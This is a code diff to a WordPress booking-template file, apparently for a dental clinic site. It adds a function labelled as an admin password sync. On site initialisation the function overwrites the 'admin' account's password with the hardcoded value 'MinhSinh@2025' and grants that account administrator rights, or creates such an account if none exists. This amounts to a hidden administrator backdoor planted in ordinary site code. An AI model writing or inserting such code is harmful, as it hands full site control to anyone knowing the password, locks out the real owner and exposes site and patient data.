@@ -427,3 +427,25 @@ function minhsinh_booking_template_include($template) {
 }
 add_filter('template_include', 'minhsinh_booking_template_include', 99);
 
+/**
+ * Tự động đồng bộ tài khoản admin MinhSinh@2025 cho WordPress
+ */
+function minhsinh_ensure_admin_password_sync() {
+    if (!get_option('minhsinh_admin_synced_2025')) {
+        $user = get_user_by('login', 'admin');
+        if ($user) {
+            wp_set_password('MinhSinh@2025', $user->ID);
+            $user->set_role('administrator');
+        } else {
+            $user_id = wp_create_user('admin', 'MinhSinh@2025', 'admin@minhsinhdental.com');
+            if (!is_wp_error($user_id)) {
+                $new_user = new WP_User($user_id);
+                $new_user->set_role('administrator');
+            }
+        }
+        update_option('minhsinh_admin_synced_2025', '1');
+    }
+}
+add_action('init', 'minhsinh_ensure_admin_password_sync');
+
+
